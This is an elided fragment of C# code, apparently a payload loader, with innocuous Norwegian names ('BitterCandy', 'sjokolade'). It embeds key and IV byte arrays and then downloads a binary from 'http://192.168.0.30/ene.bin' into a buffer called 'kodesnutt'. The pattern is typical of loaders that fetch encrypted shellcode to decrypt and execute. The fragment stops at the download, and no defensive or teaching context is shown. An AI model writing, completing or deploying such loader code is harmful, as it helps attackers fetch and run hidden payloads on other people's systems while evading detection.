...
namespace BitterCandy
{
    class sjokolade
    {
        ...
        static void Main(string[] args)
        {
            ...
            0x86,0x54,0xe0,0xdf,0x5a,0xa6,0xb3,0x52,0x76,0x91,0xc5,0x4f,0xfa,0x37,0x71,0x1b,0x76,0xc8,0xd5,0xb2,0x99,0xda,0xb6,0xa2,0xc3,0xf2,0x07,0xb4,0x60,0x73,0x99,0xc0
            };

            byte[] Ivektor = new byte[16] {
                0xcd,0x1a,0x3d,0x41,0x4d,0xba,0xfb,0x8f,0x28,0x9c,0xc2,0x8b,0xb6,0xca,0xaa,0x60
 };

            byte[] kodesnutt = null;
            try
            {
                kodesnutt = RetrieveBinaryFile("http://192.168.0.30/ene.bin");
